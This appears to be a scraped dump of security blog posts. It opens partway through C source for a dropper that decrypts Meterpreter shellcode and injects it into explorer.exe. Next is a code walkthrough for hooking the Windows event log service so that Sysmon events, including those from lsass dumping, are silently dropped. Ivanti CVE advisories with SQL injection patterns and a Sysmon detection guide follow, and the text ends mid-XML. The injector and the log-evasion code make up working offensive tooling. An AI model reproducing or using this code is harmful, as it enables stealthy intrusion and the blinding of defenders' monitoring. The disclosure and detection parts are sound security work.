fnCryptReleaseContext(hCryptoProv, 0); fnCryptDestroyKey(hCryptoKey); fnCryptDestroyHash(hCryptHash); return bSuccess; } DWORD FindExplorer() { PROCESSENTRY32 pe32 = {0}; pe32.dwSize = sizeof(PROCESSENTRY32); // take snapshot HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if(hSnapshot) { // enum the processes found if(Process32First(hSnapshot, \u0026pe32)) { do { // check if its explorer, if it is then give the pid if (strcmp(pe32.szExeFile, \"explorer.exe\") == 0) { return pe32.th32ProcessID; } } while(Process32Next(hSnapshot, \u0026pe32)); CloseHandle(hSnapshot); } } return -1; } int main(int argc, char const *argv[]) { DWORD dwPid; INITIAL_TEB InitTeb; LPVOID lpBuffer = NULL; CLIENT_ID uPid = { 0 }; HANDLE hThread, hProcess; OBJECT_ATTRIBUTES ObjectAttributes; // crypto stuff fnCryptAcquireContextW = (CryptAcquireContextW_)GetProcAddress(LoadLibrary(\"advapi32.dll\"), \"CryptAcquireContextW\"); fnCryptCreateHash = (CryptCreateHash_)GetProcAddress(LoadLibrary(\"advapi32.dll\"), \"CryptCreateHash\"); fnCryptHashData = (CryptHashData_)GetProcAddress(LoadLibrary(\"advapi32.dll\"), \"CryptHashData\"); fnCryptDeriveKey = (CryptDeriveKey_)GetProcAddress(LoadLibrary(\"advapi32.dll\"), \"CryptDeriveKey\"); fnCryptDecrypt = (CryptDecrypt_)GetProcAddress(LoadLibrary(\"advapi32.dll\"), \"CryptDecrypt\"); fnCryptReleaseContext = (CryptReleaseContext_)GetProcAddress(LoadLibrary(\"advapi32.dll\"), \"CryptReleaseContext\"); fnCryptDestroyKey = (CryptDestroyKey_)GetProcAddress(LoadLibrary(\"advapi32.dll\"), \"CryptDestroyKey\"); fnCryptDestroyHash = (CryptDestroyHash_)GetProcAddress(LoadLibrary(\"advapi32.dll\"), \"CryptDestroyHash\"); // decrypt the shellcode if (!DecryptShellcode()) { printf(\"[!] Failed to decrypt shellcode\\\\n\"); return -1; } // get addresss of where the hook should be lpAddr = (LPVOID)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"LdrLoadDll\"); // save the original bytes memcpy(OriginalBytes, lpAddr, 13); // set the hook HookLoadDll(lpAddr); // find the pid of explorer.exe dwPid = FindExplorer(); if (dwPid == -1) { printf(\"[!] Failed to find process\\\\n\"); return -1; } // set the pid to get a handle to uPid.UniqueProcess = (HANDLE)dwPid; uPid.UniqueThread = NULL; // get a handle on the process InitializeObjectAttributes(\u0026ObjectAttributes, NULL, 0, NULL, NULL); NtOpenProcess(\u0026hProcess, PROCESS_ALL_ACCESS, \u0026ObjectAttributes, \u0026uPid); // alloc memory NtAllocateVirtualMemory(hProcess, \u0026lpBuffer, 0, \u0026encmeter_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // write the shellcode to the process NtWriteVirtualMemory(hProcess, lpBuffer, encmeter_bin, encmeter_bin_len, NULL); // start the shellcode NtCreateThreadEx(\u0026hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, FALSE, NULL, NULL, NULL, NULL); if (hThread == INVALID_HANDLE_VALUE) { printf(\"[!] Failed to inject shellcode\\\\n\"); return -1; } printf(\"[+] Successfully injected shellcode\\\\n\"); return 0; } And when we execute our new dropper\nWe can catch a meterpreter session\nOr if we used a windows/x64/meterpreter/reverse_https payload with a set StagerURILength we can catch a shad0w beacon as well.\nHopefully some of these techniques could be of use to you. If you are interested and want to research further, my C2 Framework shad0w implements many of these techniques and more. Any questions feel free to DM me on twitter @_batsec_"},"title":"Defending Your Malware"},"/articles/2020/09/2020-09-04-pwning-windows-event-logging-with-yara-rules/":{"data":{"":"","#":"The Event Log coupled with Windows Event Forwarding and Sysmon can be extremely powerful in the hands of defenders, allowing them to detect attackers every step of the way. Obviously this is an issue for the attackers. Before privilege escalation it is limited what we can do to evade event logging, but once privileges have been elevated it is an equal playing field.\nIn the past I have released a method to evade this logging by loading a malicious kernel driver and hooking the NtTraceEvent syscall. This method is effective but has two issues. The main issue is the risk associated with loading a kernel driver and patching syscalls as there is the potential to cause a BSOD on the machine which for obvious reasons a very bad thing. The other issue is that it will simply stop all events from being reported, so while the hook is active that machine will no longer be sending events to the SOC or SIEM. Its a real possibility that defenders would notice this sudden lack of events. So is there a way to only filter out the events caused by an attacker while also remaining completely inside usermode? Yes.\nA couple of years ago @hlldz released Invoke-Phant0m. It would find the event log process and then kill all the threads running from wevtsvc.dll. This is because wevtsvc.dll is the event log service so by killing the threads associated with it will disable the logging. It works well but still has the same issue that ghost in the logs does, all events stopped from being reported. To solve this issue I wanted to make a tool that will be similar to Invoke-Phant0m but will allow an attacker to apply a filter to the events being reported so they can only block events related to there malicious actions.\nReversing the event log service. After opening wevtsvc.dll in cutter and looking around I noticed that it will open a tracing session via OpenTraceW.\nOpenTraceW takes the EVENT_TRACE_LOGFILEW structure as an argument. This structure has the value EventRecordCallback which points to the callback function that will be given the event.\nWith a bit of digging about in windbg I found the callback function is wevtsvc!EtwEventCallback\nLooking at the disassembly of the callback we can see that it does not look like a function, but rather is just a bit of assembly that will call EventCallback.\nSetting a breakpoint on wevtsvc!EtwEventCallback we are able to dig a bit more into how this callback works. It will receive the event in the EVENT_RECORD structure which looks like;\ntypedef struct _EVENT_RECORD { EVENT_HEADER EventHeader; ETW_BUFFER_CONTEXT BufferContext; USHORT ExtendedDataCount; USHORT UserDataLength; PEVENT_HEADER_EXTENDED_DATA_ITEM ExtendedData; PVOID UserData; PVOID UserContext; } EVENT_RECORD, *PEVENT_RECORD; The EVENT_HEADER structure will contain more info about the event including the provider which is reporting the event. With a little windbg magic we are able to grab this providers GUID.\nNow that we have the providers GUID we can look it up using the logman.exe utility, and see that the provider was Microsoft-Windows-Sysmon.\nNow we know we are looking in the right place we can patch this function with a ret instruction. This will stop all the events from being reported.\nBelow you can see that I cleared the event log at 7:01 then added a new user at 7:04 but this event was not reported because of our ret in the callback is causing all events system wide to be dropped.\nApplying the hook Now that we have a PoC working in windbg its time to start writing the code. I’m going to skip the injection side as there is loads of good explanations on that and go straight into how our DLL will work.\nThe first thing we need to do is find the offset of wevtsvc!EtwEventCallback so we know where to place the hook. The first step in doing that is locating the base address of wevtsvc.dll the code below will do that and store it in the dwBase variable.\nDWORD_PTR dwBase; DWORD i, dwSizeNeeded; HMODULE hModules[102400]; TCHAR szModule[MAX_PATH]; if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), \u0026dwSizeNeeded)) { \\\tfor (int i = 0; i \u003c (dwSizeNeeded / sizeof(HMODULE)); i++) \\\t{ \\\t\\\tZeroMemory((PVOID)szModule, MAX_PATH); \\\t\\\tif (GetModuleBaseNameA(GetCurrentProcess(), hModules[i], (LPSTR)szModule, sizeof(szModule) / sizeof(TCHAR))) \\\t\\\t{ \\\t\\\t\\\tif (!strcmp(\"wevtsvc.dll\", (const char*)szModule)) \\\t\\\t\\\t{ \\\t\\\t\\\t\\\tdwBase = (DWORD_PTR)hModules[i]; \\\t\\\t\\\t} \\\t\\\t} \\\t} } Since we do not know the exact location of EtwEventCallback we will need to search memory for it. We know that its in the address space of wevtsvc.dll which is why we had to find its base address.\nWe can use the disassembly from windbg to see the bytes at the start of the callback. We can then scan memory until we find these bytes. Once we have we will know where to place the hook.\nThis code will search 0xfffff bytes past the base address of wevtsvc.dll for the pattern 4883ec384c8b0d\n#define PATTERN \"\\\\x48\\\\x83\\\\xec\\\\x38\\\\x4c\\\\x8b\\\\x0d\" DWORD i; LPVOID lpCallbackOffset; for (i = 0; i \u003c 0xfffff; i++) { if (!memcmp((PVOID)(dwBase + i), (unsigned char*)PATTERN, strlen(PATTERN))) { lpCallbackOffset = (LPVOID)(dwBase + i); } } Once we have the offset we will make a copy of the bytes located there with a call to memcpy\nmemcpy(OriginalBytes, lpCallbackOffset, 50); Then apply a hook to redirect all the calls to EtwEventCallback to EtwCallbackHook\nVOID HookEtwCallback() { DWORD oldProtect, oldOldProtect; unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 }; *(void **)(boing + 2) = \u0026EtwCallbackHook; VirtualProtect(lpCallbackOffset, 13, PAGE_EXECUTE_READWRITE, \u0026oldProtect); memcpy(lpCallbackOffset, boing, sizeof(boing)); VirtualProtect(lpCallbackOffset, 13, oldProtect, \u0026oldOldProtect); return; } I’m going to skip going into details about parsing EventRecord-\u003eUserData as it could be a whole blog post on its own, but if you are interested you can see my implementation here.\nNow having hooked the callback is all good, but we still need to be able to report events we don’t want to block. This means we are going to also have to restore and run the callback so the event is reported, then re-hook it so we can catch the next event.\nUsing a typedef makes doing this pretty straight forward.\ntypedef VOID(WINAPI * EtwEventCallback_) (EVENT_RECORD *EventRecord); VOID DoOriginalEtwCallback( EVENT_RECORD *EventRecord ) { DWORD dwOldProtect; VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, \u0026dwOldProtect); memcpy(lpCallbackOffset, OriginalBytes, sizeof(OriginalBytes)); VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), dwOldProtect, \u0026dwOldProtect); EtwEventCallback_ EtwEventCallback = (EtwEventCallback_)lpCallbackOffset; EtwEventCallback(EventRecord); HookEtwCallback(); } After doing all of the we are now able to find the offset of the ETW callback, hook it to our own and parse the data. Then unpatch the callback and report the event.\nBelow you can see what the parsed event looks like in the windbg window.\nPattern matching with YARA Now that we have the event in a clear format, its time to implement filters. I decided to use YARA rules for two reasons, The first being that I love the irony of using a popular defensive tool offensively. The second reason is that it is actually perfect for this use case as it has a very well documented C API and will work completely inside memory.\nIts also worth pointing out that I have defined the following macros to keep consistency in the code style\nThe below example shows how you can create a yara rule object that can be used in YRRulesScanMem\n#define RULE_ALLOW_ALL \"rule Allow { condition: false }\" YRInitalize(); RtlCopyMemory(cRule, RULE_ALLOW_ALL, strlen(RULE_ALLOW_ALL)); if (YRCompilerCreate(\u0026yrCompiler) != ERROR_SUCCESS) { return -1; } if (YRCompilerAddString(yrCompiler, cRule, NULL) != ERROR_SUCCESS) { return -1; } YRCompilerGetRules(yrCompiler, \u0026yrRules); Once the rule object has been created we can start scanning memory. The below example will scan the StringBuffer variable which contains the formatted event and will pass the result to the yara callback function ToReportOrNotToReportThatIsTheQuestion which in turn will either set the dwReport variable to 0 or 1 depending on if the rule matched or not. There is also a hard baked check for if the PIPE_NAME variable is present in the event. The reason for this EvtMuteHook.dll will use a named pipe to dynamically update the current rule, this will cause events to be generated so this check will ensure that these events are never reported.\nINT ToReportOrNotToReportThatIsTheQuestion( YR_SCAN_CONTEXT* Context, INT Message, PVOID pMessageData, PVOID pUserData ) { if (Message == CALLBACK_MSG_RULE_MATCHING) { (*(int*)pUserData) = 1; } if (Message == CALLBACK_MSG_RULE_NOT_MATCHING) { (*(int*)pUserData) = 0; } return CALLBACK_CONTINUE; } YRRulesScanMem(yrRules, (uint8_t*)StringBuffer, strlen(StringBuffer), 0, ToReportOrNotToReportThatIsTheQuestion, \u0026dwReport, 0); if (dwReport == 0) { if (strstr(StringBuffer, PIPE_NAME) == NULL) { DoOriginalEtwCallback(EventRecord); } } Where’s the logs gone? You can grab the latest versions of EvtMute from here. EvtMuteHook.dll contains the core functionality, once it is injected it will apply a temporary filter which will allow all events to be reported, this filter can be dynamically updated without having to re-inject.\nI’ve written SharpEvtMute.exe which is a C# assembly that can easily run via execute in shad0w or execute-assembly in cobalt strike. I will be writing a native version in C for a more stealthy option.\nDisabling Logging\nA trivial use case would be to disable event logging system wide. To do this we can use the following yara rule.\nrule disable { condition: true } We will need to start by injecting the hook into the event service.\n.\\\\SharpEvtMute.exe --Inject Now that the hook is placed we can add the filter.\n.\\\\SharpEvtMute.exe --Filter \"rule disable { condition: true }\" Now all events will be dropped by the event service.\nComplex Filters\nFilters can be dynamically changed without having to re-inject a hook. This makes it quick and easy to update the active filter.\nAn example of a more complex filter is shown below. It is capable of blocking the events related to a lsass memory dump from being reported by sysmon.\nrule block_lsass_dump { meta: author = \"@_batsec_\" description = \"Prevent lsass dumping being reported by sysmon\" strings: $provider = \"Microsoft-Windows-Sysmon\" $image = \"lsass.exe\" nocase $access = \"GrantedAccess\" $type = \"0x1fffff\" condition: all of them } With a complex rule like this it is much harder to condense it into a single line. This is why I added the ability to give base64 encoded rules.\nThe rule can easily be converted to base64 from a linux command line.\nbase64 -w 0 YaraFilters/lsassdump.yar | echo $(\u003c/dev/stdin) Then using the --Encoded flag we can pass it as a filter\nOpsec Considerations When injecting the hook SharpEvtMute.exe will call CreateRemoteThread this call is made before the hook is placed so it will be reported by Sysmon. This is because the injection feature of SharpEvtMute.exe should only be used as a PoC. I recommend manually injecting EvtMuteHook.dll into the event logging service when stealth is important.\nIt’s PID can be found by running SharpEvtMute.exe --Pid. The hook can be placed by manually injecting the shellcode (run make in EvtMuteBin) via your C2 framework of choice, e.g shinject in shad0w.\nIt is also worth mentioning that the hook will use a named pipe to update filters. The named pipe is called EvtMuteHook_Rule_Pipe (this named can be changed easily). There is a rule hard baked into the hook to ensure that any events including this name will be dropped automatically but it will still be an IOC having it listening, so I recommend changing it.\nCommunity Filters If you create some useful filters feel free to make a pull request to the YaraFilters directory. It would be cool to have a good collection of filters to hide common actions that everyone can benefit from.\nThanks for reading and if you have any questions feel free to hit me up on twitter @_batsec_"},"title":"Pwning Windows Event Logging with YARA rules"},"/articles/2020/11/2020-11-11-advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/":{"data":{"":"Software: Ivanti Unified Endpoint Manager\nAffected Versions: \u003c= 2020.1.1\nVendor page: www.ivanti.com\nCVE Reference: CVE-2020-13770\nPublished: 11/11/2020\nCVSS 3.1 Score: 8.8 - AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\nAttack Vector: Local\nCredits: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau\nSummary\nSeveral services are accessing named pipes with default or overly permissive security attributes; as these services run as user ‘NT AUTHORITY\\SYSTEM’, the issue can be used to escalate privileges from a local standard or service account having SeImpersonatePrivilege (eg. user ‘NT AUTHORITY\\NETWORK SERVICE’).\nMitigation\nThere is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity.\nTechnical details\nThe process of exploiting the vulnerability consists in creating a named pipe server, waiting for the vulnerable service to connect to it as a client, extract the client’s token and use it to perform privileged actions as ‘NT AUTHORITY\\SYSTEM’. As there can only be one server-side named pipe object, to exploit the vulnerability it might be required to create the named pipe object before the legitimate process does, or alternatively kill it or cause it to crash.\nThe following named pipe client processes and named pipe objects are affected on version \u003c=2020.1.1:\nPipe name: \\\\.\\pipe\\SQLLocal\\ldmsdata\nServer process: C:\\Program Files\\Microsoft SQL Server\\MSSQL13.LDMSDATA\\MSSQL\\Binn\\sqlservr.exe\nClient processes:\nC:\\PROGRA1\\LANDesk\\MANAGE1\\landesk\\SAM\\SamServer\\bin\\SAM.O365PS_Routines.exe C:\\Program Files\\LANDesk\\LDClient\\LDdevmon.exe C:\\Program Files\\LANDesk\\ManagementSuite\\AlertService.exe C:\\Program Files\\LANDesk\\ManagementSuite\\BrokerService.exe C:\\Program Files\\LANDesk\\ManagementSuite\\ManagedPlanet.Core.Barcode.exe C:\\Program Files\\LANDesk\\ManagementSuite\\SchedQry.exe C:\\Program Files\\LANDesk\\ManagementSuite\\MDMManagementService.exe C:\\Program Files\\LANDesk\\ManagementSuite\\commands.service.exe C:\\Program Files\\LANDesk\\ManagementSuite\\CoreSyncService.exe C:\\Program Files\\LANDesk\\ManagementSuite\\ManagedPlanet.RapidDeploy.Service.exe C:\\Program Files\\LANDesk\\ManagementSuite\\MPCore.exe C:\\Program Files\\LANDesk\\ManagementSuite\\LDInv32.exe C:\\Program Files\\LANDesk\\ManagementSuite\\SchedSvc.exe C:\\Program Files\\LANDesk\\ManagementSuite\\ManagedPlanet.Common.DBMonitorService.exe C:\\Program Files\\LANDesk\\ManagementSuite\\ManagedPlanet.Common.SoftwareManager.exe C:\\Program Files\\LANDesk\\ManagementSuite\\ManagedPlanet.DiscoveryServices.Core.exe Timeline\n28/05/2020: Issue reported to the vendor\n01/06/2020: Vendor acknowledged the issues\n02/06/2020: CVE number assigned from MITRE\n13/07/2020: 90 days notice period for disclosure given to the vendor\n11/11/2020: Advisory published by JUMPSEC"},"title":"Advisory CVE-2020-13770 - Ivanti Unified Endpoint Manager named pipe token impersonation privilege escalation"},"/articles/2020/11/2020-11-11-advisory-cve-2020-13771-ivanti-uem-dll-hijacking/":{"data":{"":"Software: Ivanti Unified Endpoint Manager\nAffected Versions: \u003c= 2020.1.1\nVendor page: www.ivanti.com\nCVE Reference: CVE-2020-13771\nPublished: 11/11/2020\nCVSS 3.1 Score: 8.1 - AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H\nAttack Vector: Local\nCredit: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau\nSummary\nVarious services running as user ‘NT AUTHORITY\\SYSTEM’ rely on Windows’ DLL search order for loading DLL files that are not present on the filesystem. Under certain circumstances, a local attacker would be able to place a malicious DLL file to obtain code execution in the vulnerable service’s context to elevate privileges.\nMitigation\nThe vendor has released an update partially fixing the issue. 2019.1.4 and 2020.1.1 releases can be installed to remediate some of the instances; the remaining instances remain outstanding. It is advised to review the host configuration and monitor for suspicious activity.\nTechnical details\nAffected services attempt to load DLL libraries which are not found on the filesystem relying on Windows’ DLL search order. A local attacker able to place a purposely crafted library in one of the directories searched, such as one listed in the PATH system environment variable, would gain code execution in the context of the vulnerable service.\nVulnerable instances on version \u003c= 2020.1.1\nService “LANDesk Inventory Server”:\nldprofileui.dll Vulnerable instances on version \u003c= 2020.1\nService “LANDesk Inventory Server”:\nwfapi.dll DMIAPI32.DLL logonsrv.dll ldprofileui.dll Service “LANDesk(R) Console Redirection Service”:\nOOBCredentials.dll Timeline\n15/04/2020: Issue reported to the vendor\n16/04/2020: Vendor acknowledged the issues\n02/06/2020: CVE number assigned from MITRE\n13/07/2020: 90 days notice period for disclosure given to the vendor\n11/11/2020: Advisory published by JUMPSEC"},"title":"Advisory CVE-2020-13771 - Ivanti Unified Endpoint Manager DLL search order hijacking privilege escalation"},"/articles/2020/11/2020-11-12-advisory-cve-2020-13774-ivanti-uem-rce/":{"data":{"":"Software: Ivanti Endpoint Manager\nAffected Versions: \u003c= 2020.1; \u003c= 2019.1.3\nVendor page: www.ivanti.com\nCVE Reference: CVE-2020-13774\nPublished: 12/11/2020\nCVSS 3.1 Score: 9.9 - AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\nAttack Vector: Remote, authenticated\nCredits: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau\nSummary\nImproper validation on file upload functionality present in Ivanti Unified Endpoint Manager’s web management console permits an authenticated user to upload .aspx files and execute them on the MS IIS server’s context. The issue is caused by insufficient file extension validation and insecure file operations on the uploaded image, which upon failure will leave the temporarily created files in an accessible location on the server.\nSolution\nThe issue has been successfully resolved by the vendor in version 2020.1.1. Customers can install the latest available software update to fix the vulnerability. The vendor also communicated this has also been fixed in version 2019.1.4, although this has not been verified by JUMPSEC.\nTechnical details\nThe “/LDMS/softwaredistribution/EditLaunchPadDialog.aspx” URL permits the upload of an image file on the server. Security controls on the file extension are implemented client-side and can thus be easily bypassed. By crafting a proper .ico image file containing ASP code and uploading it with .aspx extension, it is later possible to access and execute the malicious file on “/landesk/files/.aspx”.\nThe user must be authenticated and either part of “LANDesk Admnistrators” group or both part of “Landesk Management Suite” group and be assigned to the “Software Distribution” role in order to access the vulnerable component.\nTimeline\n15/04/2020: Issue reported to the vendor\n16/04/2020: Vendor acknowledged the issues\n02/06/2020: CVE number assigned from MITRE\n13/07/2020: 90 days notice period for disclosure given to the vendor\n12/11/2020: Advisory published by JUMPSEC"},"title":"Advisory CVE-2020-13774 - Ivanti Unified Endpoint Manager authenticated RCE via file upload"},"/articles/2020/11/2020-11-13-advisory-cve-2020-13769-ivanti-uem-sql-injection/":{"data":{"":"Software: Ivanti Endpoint Manager\nAffected Versions: \u003c= 2020.1; \u003c= 2019.1.3\nVendor page: www.ivanti.com\nCVE Reference: CVE-2020-13769\nPublished: 13/11/2020\nCVSS 3.1 Score: 7.4 - AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L\nAttack Vector: Remote, authenticated\nCredits: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau\nSummary\nA number of web components in Endpoint Manager do not properly sanitize user input when executing SQL queries, leaving the application vulnerable to injection attacks towards the underlying database.\nOn a standard installation with default options, the account used to query the database is database administrator.\nSolution\nThe issue has been successfully resolved by the vendor in version 2020.1.1. Customers can install the latest available software update to fix the vulnerability. The vendor also reported this has also been fixed in version 2019.1.4, although this has not been verified by JUMPSEC.\nTechnical details\nThe following endpoints and parameters are vulnerable and exploitable by any authenticated user:\nPOST /LDMS/alert_log.aspx?d=alert_log\u0026tb=serverAlertLog.tb\n“filterValue” parameter\nType: Stacked, time-based blind, boolean-based blind\nExample: filterValue=’;injection_query_here–\nPOST /remotecontrolauth/api/device\n“global”, “displayname”, “ipaddress”, “owner” parameters\nType: Time-based blind, boolean-based blind\nExample: “global”:\"’+(injection_query_here)+’\"\nThis instance also requires a valid “sessionid” in the request.\nTimeline\n15/04/2020: Issue reported to the vendor\n16/04/2020: Vendor acknowledged the issues\n02/06/2020: CVE number assigned from MITRE\n13/07/2020: 90 days notice period for disclosure given to the vendor\n13/11/2020: Advisory published by JUMPSEC"},"title":"Advisory CVE-2020-13769 – Ivanti Unified Endpoint Manager SQL injection"},"/articles/2020/11/2020-11-13-cve-2020-13772-ivanti-uem-system-information-disclosure/":{"data":{"":"Software: Ivanti Endpoint Manager\nAffected Versions: \u003c= 2020.1.1\nVendor page: www.ivanti.com\nCVE Reference: CVE-2020-13772\nPublished: 13/11/2020\nCVSS 3.1 Score: 5.3 - AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\nAttack Vector: Remote, unauthenticated\nCredits: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau\nSummary\nIvanti Unified Endpoint Manager’s “ldcient” component expose information about the system that could be used in further attacks against the system.\nMitigation\nThere is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity. If possible, consider disabling or whitelisting access to the affected URLs.\nTechnical details\nThe following endpoint expose information about the system, such as environment variables, domain name, internal paths and CPU information:\n/ldclient/ldprov.cgi, HTTP 9595 /ldclient/ldprov.cgi, HTTPS 9594 /ldclient/ldprov.cgi, HTTPS 9593 Timeline\n15/04/2020: Issue reported to the vendor\n16/04/2020: Vendor acknowledged the issues\n02/06/2020: CVE number assigned from MITRE\n13/07/2020: 90 days notice period for disclosure given to the vendor\n13/11/2020: Advisory published by JUMPSEC"},"title":"Advisory CVE-2020-13772 - Ivanti Unified Endpoint Manager system information disclosure"},"/articles/2020/11/2020-11-13-cve-2020-13773-ivanti-uem-reflected-xss/":{"data":{"":"Software: Ivanti Endpoint Manager\nAffected Versions: \u003c= 2020.1.1\nVendor page: www.ivanti.com\nCVE Reference: CVE-2020-13773\nPublished: 13/11/2020\nCVSS 3.1 Score: 5.5 - AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L\nAttack Vector: Remote, authenticated\nCredits: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau\nSummary\nVarious web pages on Ivanti Unified Endpoint Manager web management console lack proper input validation on parameters passed in HTTP request, leaving the application vulnerable to client-side attacks. An attacker able to cause the victim to open a malicious URL would obtain javascript code execution on the victim’s browser and potentially be able to obtain sensitive information and execute actions on their behalf.\nMitigation\nThere is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity.\nTechnical details\nThe following endpoints and parameter are vulnerable:\n/LDMS/frm_splitfrm.aspx “top” parameter /LDMS/frm_splitfrm.aspx “ttb” parameter /LDMS/frm_splitfrm.aspx “splittf” parameter /LDMS/licensecheck.aspx “doc” parameter /LDMS/frm_splitcollapse.aspx “bottom” parameter /LDMS/alert_log.aspx “sortdir” parameter /LDMS/alert_log.aspx “sortcol” parameter /LDMS/ServerList.aspx “sortdir” parameter /LDMS/frm_coremainfrm.aspx “bfn” parameter /LDMS/frm_findfrm.aspx “m” parameter /LDMS/frm_taskfrm.aspx any parameter /LDMS/query_browsecomp.aspx “t” parameter /LDMS/sm_actionfrm.asp “bfn” parameter /LDMS/sm_actionfrm.asp “d” parameter Timeline\n15/04/2020: Issue reported to the vendor\n16/04/2020: Vendor acknowledged the issues\n02/06/2020: CVE number assigned from MITRE\n13/07/2020: 90 days notice period for disclosure given to the vendor\n13/11/2020: Advisory published by JUMPSEC"},"title":"Advisory CVE-2020-13773 - Ivanti Unified Endpoint Manager Reflected XSS"},"/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/":{"data":{"":"Background\nRecently we posted a bunch of advisories relating to Ivanti Unified Endpoint Manager, a couple of which are for vulnerabilities which can be used to achieve local privilege escalation.\nAt JUMPSEC, whenever we find a new vulnerability, we like to challenge ourselves to write rules to detect it being exploited. We learn a lot doing this, it’s kind of fun tweaking the exploit to try and evade detection and really challenges us to write good detection rulesets.\nNaturally, with the right signatures you can detect future exploitation of an issue, but it’s also fun/scary (delete as appropriate!) to run this on historical data and find out if someone else got there first and the vulnerability has been exploited in the wild already…\nWe enjoy doing it, we know it is valuable to our clients and we’d love to see more of it being done which is why we’re making an effort to share some detail relating to our recent Ivanti advisories.\nIntroduction\nBecause of the high number of components that make up an operating system, attackers with local access have a very wide array of possible ways to interact with the system in malicious ways, even when limited to low privileges. This corresponds to a greater effort required to properly monitor for suspicious behaviour and detect attacks.\nIn light of the recent vulnerabilities affecting Ivanti Unified Endpoint Manager we want to briefly touch on how it is possible to detect local privilege escalation attack, specifically addressing CVE-2020-13770 and CVE-2020-13771.\nYou have probably heard of Sysmon already, but in case you have not, it is a handy tool available in the Windows Sysinternals toolsuite which can track, record and store detailed system events. These events can then be viewed within Windows Event Viewer, and are usually collected by SIEM software for aggregation and analysis.\nWe’re focused on Sysmon in this writeup.\nTechnical details\nIn this section we give a brief explanation of the vulnerabilities and an example of Sysmon configuration rules to log exploitation attempts, along with the rationale behind them so you can adapt them to your existing configuration if needed. These will act as a solid first point of detection, and while the events thereby generated will be by themselves a confident indicator for malicious activity, they can be further correlated with other events for even more precise monitoring.\nCVE-2020-13771 - DLL search order hijacking\nTo exploit this vulnerability a local attacker needs to create a malicious DLL library and place it in a particular path on the filesystem. This path is entirely dependent on the host configuration; the vulnerable software relies on Windows’ DLL Search Order for desktop applications, reported below, for locating and loading a DLL file.\nWith SafeDllSearchMode enabled:\nThe directory from which the application loaded. The system directory. This is usually C:\\Windows\\System32\\ and/or C:\\Windows\\SysWow64\\ depending on the OS and process architecture. The 16-bit system directory. This is usually C:\\Windows\\System\\ The Windows directory. This is usually C:\\Windows The process’ current directory. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path. With SafeDllSearchMode disabled:\nThe directory from which the application loaded. The process’ current directory. The system directory. This is usually C:\\Windows\\System32\\ and/or C:\\Windows\\SysWow64\\ depending on the OS and process architecture. The 16-bit system directory. This is usually C:\\Windows\\System\\ The Windows directory. This is usually C:\\Windows The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path. SafeDllSearchMode is essentially a setting, enabled by default, which places the process’ current directory later in the search order to try mitigate this type of vulnerabilities. Its value can be set to 1 (enabled) or 0 (disabled) in the following registry key:\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode In both circumstances the OS will look for a DLL file in the directories listed in the PATH environment variable, in the order as they appear, in case the library has not been not found yet. This variable needs particular attention, as it is easy to end up with directories writable by Everyone; moreover many software installers will silently append their directories to it.\nIf a local attacker - or a remote one with an arbitrary filesystem write primitive - is able to place the malicious library in one of these paths, taking precedence over the path where the legitimate library is found - or regardless of precedence, if the legitimate library is not found at all - the file will be loaded by the vulnerable process, which will execute its DllMain function in its own context.\nGoing back to the Ivanti Unified Endpoint Manager instance, the DLL files referenced in the advisory are not found by the processes, leaving the attacker a handful of possible paths to place his implant.\nTo log exploitation attempts we can instruct Sysmon to record ImageLoad events; as the DLL file needs to have the precise filename the process is looking for, or else it will not be loaded, the filename is a good attribute to set filters on. Since legitimate libraries usually are signed by the software vendor or publisher, we can filter on this criteria to only log unsigned or untrusted images. The following rules will record library loading events on any process for all unsigned/untrusted libraries with these specific filenames, found anywhere in the filesystem:\n\u003cSysmon schemaversion=\"4.22\"\u003e \u003cEventFiltering\u003e \u003cRuleGroup name=\"CVE-2020-13771\" groupRelation=\"and\"\u003e \u003cImageLoad onmatch=\"include\"\u003e \u003c!-- Only log unsigned / invalid signature images --\u003e \u003cSignatureStatus condition=\"is not\"\u003eValid\u003c/SignatureStatus\u003e \u003c!-- Only log these images --\u003e \u003cImageLoaded condition=\"image\"\u003eldprofileui.dll\u003c/ImageLoaded\u003e \u003cImageLoaded condition=\"image\"\u003ewfapi.dll\u003c/ImageLoaded\u003e \u003cImageLoaded condition=\"image\"\u003eDMIAPI32.DLL\u003c/ImageLoaded\u003e \u003cImageLoaded condition=\"image\"\u003elogonsrv.dll\u003c/ImageLoaded\u003e \u003cImageLoaded condition=\"image\"\u003eldprofileui.dll\u003c/ImageLoaded\u003e \u003cImageLoaded 